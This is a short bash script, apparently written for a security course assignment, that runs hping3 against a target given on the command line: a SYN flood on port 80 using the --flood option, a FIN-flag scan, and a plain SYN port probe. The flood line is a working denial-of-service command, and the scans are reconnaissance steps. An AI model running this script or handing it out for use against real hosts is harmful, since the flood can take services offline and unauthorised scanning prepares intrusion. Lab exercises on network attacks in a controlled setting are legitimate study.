#!/bin/bash
# hping3 scan scripts for Assignment

TARGET=$1

echo "SYN Flood Attack"
hping3 -S $TARGET -p 80 --flood

echo "FIN Flag Scan"
hping3 --fin -S $TARGET -p 80

echo "Port Scan"
hping3 -S $TARGET -p 80
